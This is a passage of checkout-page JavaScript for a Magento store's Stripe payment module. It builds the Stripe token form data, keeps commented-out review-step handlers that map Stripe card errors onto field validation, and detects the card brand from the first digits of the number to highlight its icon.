                save_cc = document.getElementById('save_stripe_card').checked;
            }
            
            stripeForm = 'payment[method]='+payment.currentMethod+'&stripeToken='+pform.find('#stripeToken').val()+'&stripe_card='+pform.find('#stripe_card').val()+'&save_stripe_card='+save_cc;
            token = stripeForm;
            return token;
        }
/*        Review.prototype.save = function() {
                if (checkout.loadWaiting!=false) return;
                        checkout.setLoadWaiting('review');
                        if (payment.currentMethod+'Save' in this) {
                            var params = this[payment.currentMethod+'Save']();
                        }
                        else
                        {
                        var params = Form.serialize(payment.form);
                        }
                        if (this.agreementsForm) {
                            params += '&'+Form.serialize(this.agreementsForm);
                        }
                        params.save = true;
                        var request = new Ajax.Request(
                            this.saveUrl,
                            {
                                method:'post',
                                parameters:params,
                                onComplete: this.onComplete,
                                onSuccess: this.onSave,
                                onFailure: checkout.ajaxFailure.bind(checkout)
                            }
                        );
           
        }*/
      
//end tokenization

//rewriting the next step method from opcheckout.js
/*Review.prototype.nextStep = function(transport) {
   
    if (transport && transport.responseText) {
            try{
                response = eval('(' + transport.responseText + ')');
            }
            catch (e) {
                response = {};
            }
            if (response.redirect) {
                this.isSuccess = true;
                location.href = response.redirect;
                return;
            }
            if (response.success) {
                this.isSuccess = true;
                window.location=this.successUrl;
            }
            else
                {
                var msg = response.error_messages;
                if (typeof(msg)=='object') {
                    msg = msg.join("\n");
                }
                if (msg) {
                    if(msg == "Your card's security code is incorrect.")
                    {
                        var stripeError = true;
                        Validation.add('validate-cc-cvn', msg, function(v, elm){
                            if(stripeError)
                                return false;
                                else
                                return true;
                        });
                        checkout.gotoSection('payment');
                        checkout.reloadProgressBlock();
                        Validation.validate('radweb_stripe_cc_cid');
                        stripeError = false;
                        return;
                    }
                    else
                    if(msg == "Your card was declined.")
                    {
                        var stripeError = true;
                        Validation.add('validate-cc-number', msg, function(v, elm){
                            if(stripeError)
                                return false;
                                else
                                return true;
                        });
                        checkout.gotoSection('payment');
                        checkout.reloadProgressBlock();
                        Validation.validate('radweb_stripe_cc_number');
                        stripeError = false;
                        return;
                    }
                    else
                    if(msg == "The zip code you supplied failed validation.")
                    {
                        var stripeError = true;
                        Validation.add('validate-zip-international', msg, function(v, elm){
                            if(stripeError)
                                return false;
                                else
                                return true;
                        });
                        checkout.gotoSection('billing');
                        billing.newAddress(!this.value);
                        checkout.reloadProgressBlock();
                        Validation.validate('billing:postcode');
                        stripeError = false;
                        return;
                    }
                    else
                    if(msg == "Your card's expiration date is incorrect.")
                    {
                        var stripeError = true;
                        Validation.add('validate-cc-exp', msg, function(v, elm){
                            if(stripeError)
                                return false;
                                else
                                return true;
                        });
                        Validation.add('year', msg, function(v, elm){
                            if(stripeError)
                                return false;
                                else
                                return true;
                        });
                        checkout.gotoSection('payment');
                        checkout.reloadProgressBlock();
                        Validation.validate('radweb_stripe_expiration');
                        Validation.validate('radweb_stripe_expiration_yr');
                        stripeError = false;
                        return;
                    }
                    else
                    alert(msg);
                }
            }
            if (response.update_section) {
                $('checkout-'+response.update_section.name+'-load').update(response.update_section.html);
            }
            if (response.goto_section) {
                checkout.gotoSection(response.goto_section);
            }
        }
}*/
}
}
function ccType(num) {
        num = num.replace(/[^\d]/g, '');
        // only consider the first 6 digits to match
        num = num.slice(0,6);
        
        if (num.match(/^5[1-5][0-9]{4}$/)) {
                return 'MasterCard';
        } else if (num.match(/^4[0-9]{5}(?:[0-9]{3})?$/)) {
                return 'Visa';
        } else if (num.match(/^(6011\d{2}|65\d{4}|64[4-9]\d{3}|622(1(2[6-9]|[3-9]\d)|[2-8]\d{2}|9([01]\d|2[0-5])))$/)) {
            return 'Discover';
        }
        else if (num.match(/^(3[47]\d{4})$/)) {
            return 'AMEX';
        }
        else if (num.match(/^(?:2131|1800|35\d{2})\d{2}$/)) {
            return 'JCB';
        }
        else if (num.match(/^3(?:0[0-5]|[68][0-9])[0-9]{3}$/)) {
            return 'Diners';
        }
        return null;
}
function magentoCcType(name) {
        var mc = {
                Visa: "VI",
                MasterCard: "MC",
                Discover: "DI",
                AMEX: "AE",
                JCB: "JCB",
                Diners: "DIN"
        };
        return mc[name];
}
jQuery(function() {
    //add diners club validation
    Validation.creditCartTypes.set('DIN', [new RegExp('^(3(?:0[0-5]|[68][0-9])[0-9]{11})$'),new RegExp('^[0-9]{3}$'),true]);
    cardSelect = function() {
                var type = window.ccType(this.value);
                var cards = jQuery(this).parents('ul:first').find('.cards');
                if (cards.length) {
                        jQuery('li', cards).removeClass('on').addClass('off');
                        var ccType = jQuery(this).parents('ul:first').find('#radweb_stripe_cc_type');
                        jQuery(ccType).val('');
                        if (type) {
                                var mType = magentoCcType(type);
                                jQuery('li.' + mType, cards).removeClass('off').addClass('on');
                                jQuery(ccType).val(mType);
                        }
                }
        }
    if(jQuery.isFunction(jQuery(document).on))
    {
    jQuery(document).on('keyup', '#radweb_stripe_cc_number', cardSelect);
    }
    else
    {
    jQuery("#radweb_stripe_cc_number").live('keyup', cardSelect);
    }
});
</script>
    </div>
</div>
</body>
</html>
